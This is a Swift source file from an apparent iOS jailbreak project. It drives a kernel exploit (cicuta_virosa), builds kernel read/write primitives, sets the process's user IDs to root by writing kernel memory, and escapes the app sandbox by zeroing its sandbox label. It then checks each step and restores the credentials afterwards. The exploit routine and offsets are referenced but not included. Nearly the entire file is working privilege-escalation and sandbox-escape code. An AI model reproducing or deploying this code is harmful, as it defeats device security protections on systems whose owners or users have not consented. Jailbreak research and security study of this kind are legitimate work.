//
//  Jailbreak.swift
//  JailbreakExploration
//
//  Created by Beckett O'Brien on 12/19/21.
//

import Foundation

enum JAILBREAK_STATUS { // Probably not the best names, but it works for now
    case EXPLOIT_FAILED;
    case KERNRW_ERROR;
    case NOT_ROOT;
    case SANDBOXED;
    case SUCCESS;
}

func jailbreak() -> JAILBREAK_STATUS {
    log("[+] Starting Jailbreak...");
    registerForLogs(from: "cicuta_log");
    let our_task: UInt64 = cicuta_virosa();
    guard our_task != 0 else {
        log("[!] Error: exploit returned NULL");
        return .EXPLOIT_FAILED;
    }
    let our_proc: UInt64 = read_64(our_task + Offsets.TASK.BSD_INFO) | 0xffffff8000000000;
    log("[*] Eploit succeeded");
    log("[+] Building safer R/W primitives...");
    registerForLogs(from: "kernrw_log");
//    defer { KernRW_deinit() }
    guard KernRW_init(our_proc) else {
        log("[!] Failed to build safer R/W primitives");
        return .KERNRW_ERROR;
    }
    log("[+] Becoming root...");
    defer { restore_creds() }
    rootify(proc: our_proc);
    setgid(0);
    guard verify_root() else {
        return .NOT_ROOT;
    }
    log("[+] Escaping sandbox...");
    unsandbox(proc: our_proc);
    guard verify_unsandbox() else {
        return .SANDBOXED;
    }
    
    return .SUCCESS;
}

func rootify(proc: UInt64) {
    let ucred: UInt64 = kreadptr(proc + Offsets.PROC.UCRED);
    kwrite32(ucred + Offsets.UCRED.CR_UID, UInt32(0));
    kwrite32(ucred + Offsets.UCRED.CR_RUID, UInt32(0));
    kwrite32(ucred + Offsets.UCRED.CR_SVUID, UInt32(0));
}

func unsandbox(proc: UInt64) {
    let ucred: UInt64 = kreadptr(proc + Offsets.PROC.UCRED);
    let label: UInt64 = kreadptr(ucred + Offsets.UCRED.CR_LABEL);
    kwrite64(label + Offsets.LABEL.SANDBOX, 0);
}

func verify_root() -> Bool {
    let uid = getuid();
    let gid = getgid();
    if ((uid != 0) || (gid != 0)) {
        log("[!] Error: Didn't get expected uid and gid");
        log("[*] uid: \(uid), gid: \(gid)");
        return false;
    } else {
        log("[*] Got root");
        return true;
    }
}

func verify_unsandbox() -> Bool {
    let test_file = "/var/mobile/testjb";
    FileManager.default.createFile(atPath: test_file, contents: nil, attributes: nil)
    if (FileManager.default.fileExists(atPath: test_file)) {
        log("[*] Escaped sandbox");
        try? FileManager.default.removeItem(atPath: test_file);
        return true;
    } else {
        log("[!] Couldn't escape sandbox");
        return false;
    }
}

func restore_creds() {
    setuid(501);
    setgid(501);
    log("[*] Reset credentials");
}
